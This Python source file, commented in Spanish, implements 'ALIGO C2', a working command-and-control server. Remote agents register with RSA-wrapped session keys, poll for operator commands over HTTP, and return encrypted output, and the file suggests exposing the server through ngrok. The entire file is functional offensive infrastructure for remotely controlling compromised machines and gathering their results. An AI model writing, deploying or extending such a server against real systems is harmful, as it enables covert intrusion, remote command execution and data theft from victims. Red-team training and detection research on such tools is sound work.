# server/server.py
"""
Servidor C2 - HTTPS Version con Cifrado Híbrido
Acepta conexiones de múltiples agentes vía HTTP/HTTPS, permite al operador
elegir un agente y mandarle comandos, recibe y muestra resultados de forma cifrada.

Protocolo: HTTP con JSON (REST API).
Cifrado: RSA-2048 para intercambio de llaves + Fernet (AES-128) para sesión.
"""

import os
import sys
import uuid
import time
import json
import threading
from datetime import datetime
from flask import Flask, request, jsonify

# Agregar el directorio raíz a sys.path para poder importar shared/
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from shared.crypto_utils import C2Crypto

HOST = "0.0.0.0"
PORT = int(os.getenv("PORT", 5000))  # Puerto configurable vía variable de entorno

app = Flask(__name__)
app.config['JSON_SORT_KEYS'] = False

# Variables de Criptografía de Servidor (Generadas en el inicio)
server_private_key = None
server_public_key = None

# Diccionario de agentes conectados: {agent_id: info}
# Contiene: {"hostname", "os", "last_seen", "ip", "session_key"}
agents = {}
agents_lock = threading.Lock()

# Cola de comandos pendientes por agente: {agent_id: [comandos...]}
pending_commands = {}

# Resultados recibidos (opcional, para debug)
results_history = []


# ============================================
# ENDPOINTS HTTP
# ============================================

@app.route('/public-key', methods=['GET'])
def get_public_key():
    """Entrega la llave pública RSA del servidor en formato PEM para el Handshake."""
    pem_key = C2Crypto.serialize_public_key(server_public_key)
    return jsonify({"public_key": pem_key})


@app.route('/checkin', methods=['POST'])
def checkin():
    """Agente se registra inicialmente y envía su llave Fernet cifrada con RSA."""
    data = request.json
    if not data:
        return jsonify({"error": "Payload JSON requerido"}), 400

    agent_id = data.get('agent_id', str(uuid.uuid4())[:8])
    hostname = data.get('hostname', 'unknown')
    os_type = data.get('os', 'unknown')
    encrypted_session_key = data.get('encrypted_session_key')

    if not encrypted_session_key:
        return jsonify({"error": "encrypted_session_key es requerido para el registro"}), 400

    try:
        # Descifrar la llave simétrica (Fernet) generada por el agente usando la llave privada RSA del servidor
        session_key = C2Crypto.rsa_decrypt(server_private_key, encrypted_session_key)
        
        with agents_lock:
            agents[agent_id] = {
                "hostname": hostname,
                "os": os_type,
                "last_seen": datetime.now(),
                "ip": request.remote_addr,
                "session_key": session_key  # Guardamos la llave simétrica de sesión descifrada (bytes)
            }
            if agent_id not in pending_commands:
                pending_commands[agent_id] = []
        
        print(f"\n[+] Agente conectado: {agent_id} desde {request.remote_addr} ({hostname}) [Canal Cifrado Establecido]")
        print("> ", end="", flush=True)
        
        return jsonify({"status": "ok", "agent_id": agent_id})
    except Exception as e:
        print(f"\n[!] Error decifrando llave de sesión de {agent_id}: {e}")
        return jsonify({"error": "Fallo en el descifrado de llave de sesión"}), 400


@app.route('/poll', methods=['POST'])
def poll():
    """Agente pregunta si hay comandos pendientes (envía respuesta cifrada)."""
    data = request.json
    if not data:
        return jsonify({"error": "Payload JSON requerido"}), 400

    agent_id = data.get('agent_id')
    if not agent_id:
        return jsonify({"error": "agent_id requerido"}), 400
    
    # Validar que el agente esté registrado
    with agents_lock:
        if agent_id not in agents:
            return jsonify({"error": "Agente no registrado"}), 401
        
        # Actualizar last_seen
        agents[agent_id]['last_seen'] = datetime.now()
        session_key = agents[agent_id]['session_key']
        
        # Obtener comando pendiente
        cmd = None
        if agent_id in pending_commands and pending_commands[agent_id]:
            cmd = pending_commands[agent_id].pop(0)

    # Preparar el paquete a transmitir
    if cmd:
        cmd_json = json.dumps(cmd)
    else:
        # Si no hay comandos, se responde un objeto nulo de forma estructurada
        cmd_json = json.dumps({"command": None})

    try:
        # Cifrar el comando JSON de forma simétrica usando la llave Fernet de este agente específico
        encrypted_payload = C2Crypto.fernet_encrypt(session_key, cmd_json)
        return jsonify({"payload": encrypted_payload})
    except Exception as e:
        print(f"\n[!] Error cifrando comando para {agent_id}: {e}")
        return jsonify({"error": "Error interno de cifrado"}), 500


@app.route('/result', methods=['POST'])
def result():
    """Agente envía el resultado de un comando ejecutado de forma cifrada."""
    data = request.json
    if not data:
        return jsonify({"error": "Payload JSON requerido"}), 400

    agent_id = data.get('agent_id')
    encrypted_payload = data.get('payload')

    if not agent_id or not encrypted_payload:
        return jsonify({"error": "agent_id y payload requeridos"}), 400

    with agents_lock:
        if agent_id not in agents:
            return jsonify({"error": "Agente no registrado"}), 401
        session_key = agents[agent_id]['session_key']

    try:
        # Descifrar los resultados utilizando la llave Fernet de la sesión del agente
        decrypted_bytes = C2Crypto.fernet_decrypt(session_key, encrypted_payload)
        decrypted_str = decrypted_bytes.decode('utf-8') if isinstance(decrypted_bytes, bytes) else decrypted_bytes
        result_data = json.loads(decrypted_str)

        msg_id = result_data.get('id')
        output = result_data.get('output', '')
        status = result_data.get('status', 'ok')
        
        # Guardar en historial
        results_history.append({
            "agent_id": agent_id,
            "id": msg_id,
            "output": output,
            "status": status,
            "timestamp": datetime.now()
        })
        
        # Mostrar resultado descifrado en la consola del operador
        print(f"\n[resultado de {agent_id}] (id={msg_id}):")
        print(output)
        print("> ", end="", flush=True)
        
        return jsonify({"status": "ok"})
    except Exception as e:
        print(f"\n[!] Error descifrando resultado de {agent_id}: {e}")
        return jsonify({"error": "Fallo en el descifrado del resultado"}), 400


@app.route('/health', methods=['GET'])
def health():
    """Endpoint de salud para verificar que el servidor está vivo."""
    return jsonify({
        "status": "ok",
        "agents_connected": len(agents),
        "timestamp": datetime.now().isoformat()
    })


# ============================================
# CONSOLA DEL OPERADOR
# ============================================

def operator_console():
    """Consola interactiva para que el operador mande comandos."""
    print("Consola de operador. Comandos:")
    print("  list                  -> lista agentes conectados")
    print("  use <agent_id> <cmd>  -> manda un comando a un agente")
    print("  use @agent <cmd>      -> usa el único agente (si solo hay uno)")
    print("  exit                  -> salir\n")

    while True:
        try:
            line = input("> ").strip()
        except EOFError:
            break
        except KeyboardInterrupt:
            print("\n[*] Usa 'exit' para salir")
            continue

        if not line:
            continue

        if line == "list":
            from datetime import timedelta
            with agents_lock:
                # Filtrar solo agentes activos (última actividad < 30 segundos)
                now = datetime.now()
                active_threshold = timedelta(seconds=30)
                active_agents = {
                    aid: info for aid, info in agents.items()
                    if (now - info['last_seen']) < active_threshold
                }
                
                if not active_agents:
                    print("(sin agentes conectados)")
                else:
                    for aid, info in active_agents.items():
                        last_seen = info['last_seen'].strftime("%H:%M:%S")
                        print(f" - {aid} | {info['hostname']} | {info['os']} | last_seen: {last_seen}")

        elif line.startswith("use "):
            parts = line.split(" ", 2)
            if len(parts) < 3:
                print("Uso: use <agent_id> <comando>")
                print("     use @agent <comando>  (usa el único agente si solo hay uno)")
                continue
            _, agent_id, command = parts
            
            # Si usa @agent, auto-selecciona el único agente conectado
            if agent_id == "@agent":
                with agents_lock:
                    if len(agents) == 0:
                        print("Error: No hay agentes conectados")
                        continue
                    elif len(agents) == 1:
                        agent_id = list(agents.keys())[0]
                        print(f"[auto-seleccionado] {agent_id}")
                    else:
                        print(f"Error: Hay {len(agents)} agentes conectados. Especifica uno:")
                        for aid in agents:
                            print(f" - {aid}")
                        continue
            
            with agents_lock:
                if agent_id not in agents:
                    print(f"Agente '{agent_id}' no encontrado")
                    continue
            
            # Crear comando y agregarlo a la cola
            msg_id = str(uuid.uuid4())[:8]
            cmd_obj = {
                "type": "cmd",
                "id": msg_id,
                "command": command
            }
            
            with agents_lock:
                if agent_id not in pending_commands:
                    pending_commands[agent_id] = []
                pending_commands[agent_id].append(cmd_obj)
            
            print(f"[enviado] id={msg_id} -> {agent_id}: {command}")

        elif line == "exit":
            print("[*] Cerrando servidor...")
            os._exit(0)

        else:
            print(f"Comando no reconocido: {line}")


# ============================================
# MAIN
# ============================================

def main():
    global server_private_key, server_public_key
    
    print("=" * 60)
    print("  ALIGO C2 - Servidor HTTPS con Cifrado Híbrido")
    print("=" * 60)
    print("[*] Generando par de llaves RSA-2048 del servidor...")
    server_private_key, server_public_key = C2Crypto.generate_rsa_keypair()
    print("[✓] Llave pública y privada RSA creadas exitosamente")
    print(f"[*] Servidor HTTP escuchando en {HOST}:{PORT}")
    print(f"[*] Usa ngrok con: ngrok http {PORT}")
    print(f"[*] Los logs de Flask se muestran mezclados con la consola")
    print(f"[*] Esto es normal - los comandos funcionan correctamente")
    print()
    
    # Thread de limpieza automática de agentes inactivos
    def cleanup_inactive_agents():
        from datetime import timedelta
        while True:
            time.sleep(60)  # Cada 60 segundos
            with agents_lock:
                now = datetime.now()
                inactive_threshold = timedelta(minutes=2)  # 2 minutos sin actividad
                inactive_agents = [
                    aid for aid, info in agents.items()
                    if (now - info['last_seen']) > inactive_threshold
                ]
                for aid in inactive_agents:
                    agents.pop(aid, None)
                    pending_commands.pop(aid, None)
    
    cleanup_thread = threading.Thread(target=cleanup_inactive_agents, daemon=True)
    cleanup_thread.start()
    
    # Iniciar Flask en un thread separado
    def run_flask():
        import logging
        log = logging.getLogger('werkzeug')
        log.setLevel(logging.ERROR)  # Solo errores, no logs de cada request
        app.run(host=HOST, port=PORT, debug=False, use_reloader=False)
    
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    # Dar tiempo a Flask para iniciar
    time.sleep(1)
    
    # Iniciar consola del operador en el thread principal
    try:
        operator_console()
    except KeyboardInterrupt:
        print("\n[*] Servidor detenido")
        sys.exit(0)


if __name__ == "__main__":
    main()